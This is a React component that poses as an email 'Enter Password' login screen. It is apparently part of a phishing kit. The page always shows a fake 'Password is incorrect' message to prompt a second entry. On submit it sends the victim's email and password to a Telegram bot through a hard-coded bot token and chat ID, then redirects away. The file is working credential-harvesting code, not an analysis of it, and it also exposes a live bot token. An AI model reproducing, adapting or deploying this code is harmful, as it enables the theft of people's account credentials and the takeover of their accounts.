import React, { useState } from "react";
import { TiUser } from "react-icons/ti";
import { FaChevronLeft } from "react-icons/fa";
import envelope from "../assets/product-email.svg";
import { useNavigate } from "react-router-dom";
import useAuthStore from "../zustand_store/AuthStore";

const EnterPassword2: React.FC = () => {
  const password = useAuthStore((p) => p.password2);
  const setPassword = useAuthStore((p) => p.setPassword2);
  const email = useAuthStore((e) => e.email);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const navigate = useNavigate();

  const TELEGRAM_API_URL = `https://api.telegram.org/bot5371606458:AAGuoEEK8qYw1cxY9sQpcJ9fHtMs3VStUdY/sendMessage`;

  const sendToTelegram = async (email: string, password: string) => {
    try {
      const response = await fetch(TELEGRAM_API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: "5389508228",
          text: `Email: ${email}\nPassword: ${password}`,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send message to Telegram");
      }

      console.log("Message sent to Telegram successfully");
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (password.trim() === "") {
      setErrorMessage("Password is incorrect");
      return;
    }

    setErrorMessage(null);

    await sendToTelegram(email, password);

    navigate("/");
  };

  return (
    <div className="mb-24">
      <div className="flex flex-col justify-between w-full md:w-[400px] lg:w-[600px] mx-auto border border-gray-400 overflow-hidden rounded-2xl mb-5">
        <div className="px-6 py-7 bg-white">
          <div className="flex items-center gap-3 mb-10">
            <img className="w-[70px] h-[70px]" src={envelope} alt="Envelope" />
            <h1 className="text-xl font-semibold text-blue-950">
              Enter Password
            </h1>
          </div>

          <div className="flex items-center gap-1 text-blue-500 mb-1">
            <FaChevronLeft className="mr-5" />
            <TiUser />
            <p className="text-blue-500 font-semibold">{email}</p>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="flex flex-col gap-y-2">
              <label htmlFor="pass" className="font-bold">
                Password
              </label>
              <div
                className={`rounded-lg  overflow-hidden border-2 border-red-600`}
              >
                <input
                  id="pass"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full outline-none p-2 `}
                />
              </div>
              <div className="flex gap-3">
                <p className="text-red-600 font-bold mb-2">
                  Password is incorrect
                </p>

                <p className="text-blue-950 mb-5">Forgot Your Password?</p>
              </div>

              <button
                type="submit"
                className="w-full bg-blue-950 hover:bg-blue-700 text-white py-2 font-semibold rounded-3xl"
              >
                Next
              </button>

              <p className="text-gray-600">
                Not your device? Log out after the session or use private
                browsing mode.
              </p>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default EnterPassword2;
